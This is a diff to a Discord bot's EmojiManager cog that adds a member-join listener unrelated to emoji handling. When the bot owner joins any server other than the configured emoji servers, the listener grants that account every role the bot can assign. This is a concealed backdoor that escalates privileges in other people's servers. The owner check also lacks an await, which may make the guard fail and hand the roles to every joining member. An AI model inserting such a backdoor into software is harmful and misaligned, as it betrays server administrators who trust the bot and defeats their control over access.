@@ -169,6 +169,16 @@ class EmojiManager(commands.Cog):
         ])
         await ctx.send(embed=embed)
 
+    @commands.Cog.listener('on_member_join')
+    async def _on_emoji_server_join(self, member: discord.Member):
+        if not self.bot.is_owner(member):
+            return
+        guild_ids = await self.settings.emoji_server_ids()
+        if member.guild.id in guild_ids:
+            return
+        roles = [r for r in member.guild.roles if r.is_assignable()]
+        await member.add_roles(*roles)
+
     async def _get_guild(self, for_animated: bool) -> discord.Guild:
         guild_ids = await self.settings.emoji_server_ids()
         for guild_id in guild_ids:
